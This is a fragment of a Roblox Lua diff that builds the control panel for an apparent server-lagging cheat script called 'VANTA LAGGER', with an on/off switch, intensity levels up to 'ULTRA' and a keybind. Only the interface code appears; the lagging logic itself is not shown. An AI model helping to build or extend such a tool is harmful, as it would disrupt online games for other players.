+btnMinus.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+btnMinus.Size = UDim2.new(0, 18, 0, 16)
+btnMinus.Position = UDim2.new(1, -98, 0, 5)
+btnMinus.Font = Enum.Font.GothamBlack
+btnMinus.Text = "-"
+btnMinus.TextColor3 = Color3.fromRGB(255, 255, 255)
+btnMinus.TextSize = 10
+btnMinus.AutoButtonColor = false
+btnMinus.ZIndex = 11
+btnMinus.BorderSizePixel = 0
+Instance.new("UICorner", btnMinus).CornerRadius = UDim.new(0, 4)
+
+btnMinus.MouseEnter:Connect(function()
+    TweenService:Create(btnMinus, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    }):Play()
+end)
+
+btnMinus.MouseLeave:Connect(function()
+    TweenService:Create(btnMinus, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    }):Play()
+end)
+
+btnMinus.MouseButton1Click:Connect(function()
+    shrinkPanel()
+    animateButton(btnMinus)
+end)
+
+btnPlus = Instance.new("TextButton", mainFrame)
+btnPlus.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+btnPlus.Size = UDim2.new(0, 18, 0, 16)
+btnPlus.Position = UDim2.new(1, -118, 0, 5)
+btnPlus.Font = Enum.Font.GothamBlack
+btnPlus.Text = "+"
+btnPlus.TextColor3 = Color3.fromRGB(255, 255, 255)
+btnPlus.TextSize = 10
+btnPlus.AutoButtonColor = false
+btnPlus.ZIndex = 11
+btnPlus.BorderSizePixel = 0
+Instance.new("UICorner", btnPlus).CornerRadius = UDim.new(0, 4)
+
+btnPlus.MouseEnter:Connect(function()
+    TweenService:Create(btnPlus, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    }):Play()
+end)
+
+btnPlus.MouseLeave:Connect(function()
+    TweenService:Create(btnPlus, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    }):Play()
+end)
+
+btnPlus.MouseButton1Click:Connect(function()
+    expandPanel()
+    animateButton(btnPlus)
+end)
+
+task.spawn(function()
+    while true do
+        task.wait(math.random(3, 8))
+        triggerGlitch()
+    end
+end)
+
+titleLabel = Instance.new("TextLabel", mainFrame)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Position = UDim2.new(0, 12, 0, 0)
+titleLabel.Size = UDim2.new(1, -190, 0, 26)
+titleLabel.Font = Enum.Font.GothamBlack
+titleLabel.Text = "VANTA LAGGER"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.TextSize = 11
+titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+titleLabel.TextYAlignment = Enum.TextYAlignment.Center
+titleLabel.ZIndex = 3
+
+statusDot = Instance.new("Frame")
+statusDot.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+statusDot.Size = UDim2.new(0, 5, 0, 5)
+statusDot.Position = UDim2.new(0, 2, 0, 10)
+statusDot.BorderSizePixel = 0
+statusDot.ZIndex = 3
+statusDot.Parent = titleLabel
+Instance.new("UICorner", statusDot).CornerRadius = UDim.new(1, 0)
+
+local softGray = Color3.fromRGB(200, 200, 200)
+local pureWhite = Color3.fromRGB(255, 255, 255)
+
+task.spawn(function()
+    while true do
+        TweenService:Create(titleLabel, TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
+            TextColor3 = softGray,
+            TextSize = titleLabel.TextSize
+        }):Play()
+        task.wait(0.4)
+        TweenService:Create(titleLabel, TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
+            TextColor3 = pureWhite,
+            TextSize = titleLabel.TextSize + 1
+        }):Play()
+        task.wait(0.4)
+    end
+end)
+
+lockToggleContainer = Instance.new("Frame", mainFrame)
+lockToggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
+lockToggleContainer.Position = UDim2.new(1, -60, 0, 7)
+lockToggleContainer.Size = UDim2.new(0, 50, 0, 16)
+lockToggleContainer.ZIndex = 3
+Instance.new("UICorner", lockToggleContainer).CornerRadius = UDim.new(1, 0)
+
+lockToggleBall = Instance.new("Frame", lockToggleContainer)
+lockToggleBall.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+lockToggleBall.Size = UDim2.new(0, 14, 0, 14)
+lockToggleBall.Position = UDim2.new(0, 2, 0.5, -7)
+lockToggleBall.ZIndex = 4
+Instance.new("UICorner", lockToggleBall).CornerRadius = UDim.new(1, 0)
+
+lockToggleClick = Instance.new("TextButton", lockToggleContainer)
+lockToggleClick.BackgroundTransparency = 0
+lockToggleClick.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+lockToggleClick.Size = UDim2.new(1, 0, 1, 0)
+lockToggleClick.ZIndex = 5
+lockToggleClick.Font = UI_CONFIG.Font
+lockToggleClick.Text = "UNLOCK"
+lockToggleClick.TextSize = 7
+lockToggleClick.TextColor3 = Color3.fromRGB(255, 255, 255)
+lockToggleClick.TextXAlignment = Enum.TextXAlignment.Center
+lockToggleClick.TextYAlignment = Enum.TextYAlignment.Center
+lockToggleClick.AutoButtonColor = false
+lockToggleClick.MouseButton1Click:Connect(function()
+    windowLocked = not windowLocked
+    updateLockToggle()
+    SaveConfig()
+end)
+Instance.new("UICorner", lockToggleClick).CornerRadius = UDim.new(1, 0)
+
+textEnable = Instance.new("TextLabel", mainFrame)
+textEnable.BackgroundTransparency = 1
+textEnable.Position = UDim2.new(0, 10, 0, 32)
+textEnable.Size = UDim2.new(0, 38, 0, 16)
+textEnable.Font = UI_CONFIG.Font
+textEnable.Text = "ENABLE"
+textEnable.TextColor3 = UI_CONFIG.TextColor
+textEnable.TextSize = 9
+textEnable.TextXAlignment = Enum.TextXAlignment.Left
+textEnable.ZIndex = 3
+
+textLagger = Instance.new("TextLabel", mainFrame)
+textLagger.BackgroundTransparency = 1
+textLagger.Position = UDim2.new(0, 50, 0, 32)
+textLagger.Size = UDim2.new(0, 42, 0, 16)
+textLagger.Font = UI_CONFIG.Font
+textLagger.Text = "LAGGER"
+textLagger.TextColor3 = UI_CONFIG.TextColor
+textLagger.TextSize = 9
+textLagger.TextXAlignment = Enum.TextXAlignment.Left
+textLagger.ZIndex = 3
+
+toggleContainer = Instance.new("Frame", mainFrame)
+toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
+toggleContainer.Position = UDim2.new(1, -60, 0, 30)
+toggleContainer.Size = UDim2.new(0, 50, 0, 20)
+toggleContainer.ZIndex = 12
+Instance.new("UICorner", toggleContainer).CornerRadius = UDim.new(1, 0)
+
+toggleBall = Instance.new("Frame", toggleContainer)
+toggleBall.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+toggleBall.Size = UDim2.new(0, 18, 0, 18)
+toggleBall.Position = UDim2.new(0, 2, 0.5, -9)
+toggleBall.ZIndex = 13
+Instance.new("UICorner", toggleBall).CornerRadius = UDim.new(1, 0)
+
+toggleClick = Instance.new("TextButton", toggleContainer)
+toggleClick.BackgroundTransparency = 0
+toggleClick.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+toggleClick.Size = UDim2.new(1, 0, 1, 0)
+toggleClick.ZIndex = 14
+toggleClick.Font = UI_CONFIG.Font
+toggleClick.Text = "OFF"
+toggleClick.TextSize = 9
+toggleClick.TextColor3 = Color3.fromRGB(255, 255, 255)
+toggleClick.TextXAlignment = Enum.TextXAlignment.Center
+toggleClick.TextYAlignment = Enum.TextYAlignment.Center
+toggleClick.AutoButtonColor = false
+toggleClick.MouseButton1Click:Connect(toggleLagger)
+Instance.new("UICorner", toggleClick).CornerRadius = UDim.new(1, 0)
+
+task.spawn(function()
+    while true do
+        if laggerActive then
+            local sx = currentSize.X.Offset / 200
+            local sy = currentSize.Y.Offset / 120
+            local w = windowMinimized and 38 or 50
+            local h = windowMinimized and 16 or 20
+            TweenService:Create(toggleContainer, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
+                Size = UDim2.new(0, (w + 2) * sx, 0, (h + 2) * sy)
+            }):Play()
+            task.wait(0.8)
+            TweenService:Create(toggleContainer, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
+                Size = UDim2.new(0, w * sx, 0, h * sy)
+            }):Play()
+            task.wait(0.8)
+        else
+            task.wait(1)
+        end
+    end
+end)
+
+powerIndicator = Instance.new("TextLabel", mainFrame)
+powerIndicator.BackgroundTransparency = 1
+powerIndicator.Position = UDim2.new(0, 10, 0, 60)
+powerIndicator.Size = UDim2.new(0, 80, 0, 14)
+powerIndicator.Font = UI_CONFIG.Font
+powerIndicator.Text = "STANDBY"
+powerIndicator.TextColor3 = Color3.fromRGB(120, 120, 120)
+powerIndicator.TextSize = 8
+powerIndicator.TextXAlignment = Enum.TextXAlignment.Left
+powerIndicator.ZIndex = 3
+
+local btnY = 84
+local btnW = 42
+local btnH = 22
+local spacing = 5
+local leftMargin = 9
+
+local function applyHoverEffect(btn, activeColor)
+    btn.MouseEnter:Connect(function()
+        local w = btn.Size.X.Offset
+        local h = btn.Size.Y.Offset
+        TweenService:Create(btn, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+            BackgroundColor3 = activeColor or UI_CONFIG.ButtonAct,
+            TextColor3 = Color3.fromRGB(0, 0, 0),
+            Size = UDim2.new(0, w + 4, 0, h + 4)
+        }):Play()
+    end)
+
+    btn.MouseLeave:Connect(function()
+        updateLevelButtons()
+        local w = btn.Size.X.Offset - 4
+        local h = btn.Size.Y.Offset - 4
+        TweenService:Create(btn, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+            Size = UDim2.new(0, w, 0, h)
+        }):Play()
+    end)
+end
+
+btnLow = Instance.new("TextButton", mainFrame)
+btnLow.Size = UDim2.new(0, btnW, 0, btnH)
+btnLow.Position = UDim2.new(0, leftMargin, 0, btnY)
+btnLow.Font = UI_CONFIG.Font
+btnLow.Text = "LOW"
+btnLow.TextColor3 = Color3.fromRGB(255, 255, 255)
+btnLow.TextSize = 9
+btnLow.AutoButtonColor = false
+btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
+btnLow.BorderSizePixel = 1
+btnLow.BorderColor3 = UI_CONFIG.BorderColor
+btnLow.ZIndex = 3
+Instance.new("UICorner", btnLow).CornerRadius = UDim.new(0, 4)
+btnLow.MouseButton1Click:Connect(function()
+    changeLevel("Low")
+    animateButton(btnLow)
+end)
+applyHoverEffect(btnLow)
+
+btnMid = Instance.new("TextButton", mainFrame)
+btnMid.Size = UDim2.new(0, btnW, 0, btnH)
+btnMid.Position = UDim2.new(0, leftMargin + btnW + spacing, 0, btnY)
+btnMid.Font = UI_CONFIG.Font
+btnMid.Text = "MID"
+btnMid.TextColor3 = Color3.fromRGB(255, 255, 255)
+btnMid.TextSize = 9
+btnMid.AutoButtonColor = false
+btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
+btnMid.BorderSizePixel = 1
+btnMid.BorderColor3 = UI_CONFIG.BorderColor
+btnMid.ZIndex = 3
+Instance.new("UICorner", btnMid).CornerRadius = UDim.new(0, 4)
+btnMid.MouseButton1Click:Connect(function()
+    changeLevel("Mid")
+    animateButton(btnMid)
+end)
+applyHoverEffect(btnMid)
+
+btnHigh = Instance.new("TextButton", mainFrame)
+btnHigh.Size = UDim2.new(0, btnW, 0, btnH)
+btnHigh.Position = UDim2.new(0, leftMargin + (btnW + spacing) * 2, 0, btnY)
+btnHigh.Font = UI_CONFIG.Font
+btnHigh.Text = "HIGH"
+btnHigh.TextColor3 = Color3.fromRGB(255, 255, 255)
+btnHigh.TextSize = 9
+btnHigh.AutoButtonColor = false
+btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
+btnHigh.BorderSizePixel = 1
+btnHigh.BorderColor3 = UI_CONFIG.BorderColor
+btnHigh.ZIndex = 3
+Instance.new("UICorner", btnHigh).CornerRadius = UDim.new(0, 4)
+btnHigh.MouseButton1Click:Connect(function()
+    changeLevel("High")
+    animateButton(btnHigh)
+end)
+applyHoverEffect(btnHigh)
+
+btnUltra = Instance.new("TextButton", mainFrame)
+btnUltra.Size = UDim2.new(0, btnW + 4, 0, btnH)
+btnUltra.Position = UDim2.new(0, leftMargin + (btnW + spacing) * 3, 0, btnY)
+btnUltra.Font = UI_CONFIG.Font
+btnUltra.Text = "ULTRA"
+btnUltra.TextColor3 = Color3.fromRGB(255, 255, 255)
+btnUltra.TextSize = 8
+btnUltra.AutoButtonColor = false
+btnUltra.BackgroundColor3 = UI_CONFIG.ButtonInact
+btnUltra.BorderSizePixel = 1
+btnUltra.BorderColor3 = UI_CONFIG.BorderColor
+btnUltra.ZIndex = 3
+Instance.new("UICorner", btnUltra).CornerRadius = UDim.new(0, 4)
+btnUltra.MouseButton1Click:Connect(function()
+    if currentLevel == "Ultra" then return end
+    changeLevel("Ultra")
+    animateButton(btnUltra)
+end)
+applyHoverEffect(btnUltra)
+
+updateLevelButtons()
+updateSwitch()
+updateLockToggle()
+updateUIScale()
+
+if windowMinimized then
+    windowMinimized = false
+    toggleMinimizeWindow()
+end
+
+local isDragging, dragStart, startPos = false, nil, nil
+
+mainFrame.InputBegan:Connect(function(input)
+    if windowLocked then return end
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        isDragging = true
+        dragStart = input.Position
+        startPos = mainFrame.Position
+        if not windowMinimized then
+            TweenService:Create(mainFrame, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                Size = UDim2.new(0, currentSize.X.Offset + 4, 0, currentSize.Y.Offset + 4)
+            }):Play()
+        end
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if not isDragging or windowLocked then return end
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        local delta = input.Position - dragStart
+        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+mainFrame.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        isDragging = false
+        if not windowMinimized then
+            TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out), {
+                Size = currentSize
+            }):Play()
+        end
+        SaveConfig()
+    end
+end)
+
+UserInputService.InputBegan:Connect(function(input, gp)
+    if gp then return end
+    if input.KeyCode == keybind then
+        toggleLagger()
+    end
+end)
+
+
+
